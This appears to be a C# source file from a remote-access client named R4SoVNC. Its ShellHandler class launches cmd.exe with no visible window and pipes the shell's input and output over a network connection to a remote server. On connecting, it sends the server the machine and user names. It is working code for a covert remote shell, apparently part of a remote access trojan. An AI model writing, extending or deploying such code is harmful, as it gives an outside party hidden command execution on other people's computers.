using System;
using System.Diagnostics;
using System.Text;
using R4SoVNC.Client.Network;
using R4SoVNC.Client.Protocol;

namespace R4SoVNC.Client.Shell
{
    public class ShellHandler : IDisposable
    {
        private readonly ServerConnection _conn;
        private Process? _process;
        private bool _active;

        public ShellHandler(ServerConnection conn)
        {
            _conn = conn;
        }

        public void Start()
        {
            if (_active) return;
            _active = true;

            try
            {
                var psi = new ProcessStartInfo("cmd.exe")
                {
                    UseShellExecute        = false,
                    RedirectStandardInput  = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError  = true,
                    CreateNoWindow         = true,
                    StandardOutputEncoding = Encoding.UTF8,
                    StandardErrorEncoding  = Encoding.UTF8,
                };

                _process = new Process { StartInfo = psi, EnableRaisingEvents = true };

                _process.OutputDataReceived += (s, e) =>
                {
                    if (e.Data != null)
                        SendOutput(e.Data);
                };

                _process.ErrorDataReceived += (s, e) =>
                {
                    if (e.Data != null)
                        SendOutput("[ERR] " + e.Data);
                };

                _process.Exited += (s, e) =>
                {
                    _active = false;
                    SendOutput("[Shell process exited]");
                };

                _process.Start();
                _process.BeginOutputReadLine();
                _process.BeginErrorReadLine();

                SendOutput("Microsoft Windows CMD Shell — Remote Session Active");
                SendOutput($"Machine: {Environment.MachineName}  |  User: {Environment.UserName}");
                SendOutput(new string('─', 55));
                SendOutput("");
            }
            catch (Exception ex)
            {
                SendOutput($"[!] Failed to start CMD: {ex.Message}");
                _active = false;
            }
        }

        public void SendCommand(string command)
        {
            if (!_active || _process == null || _process.HasExited) return;
            try
            {
                _process.StandardInput.WriteLine(command);
                _process.StandardInput.Flush();
            }
            catch (Exception ex)
            {
                SendOutput($"[!] Send error: {ex.Message}");
            }
        }

        public void Stop()
        {
            _active = false;
            try
            {
                _process?.StandardInput.WriteLine("exit");
                _process?.WaitForExit(2000);
                _process?.Kill();
            }
            catch { }
            _process?.Dispose();
            _process = null;
        }

        private void SendOutput(string text)
        {
            if (!_conn.IsConnected) return;
            _conn.Send(new Packet(PacketType.ShellOutput, text));
        }

        public void Dispose() => Stop();
    }
}
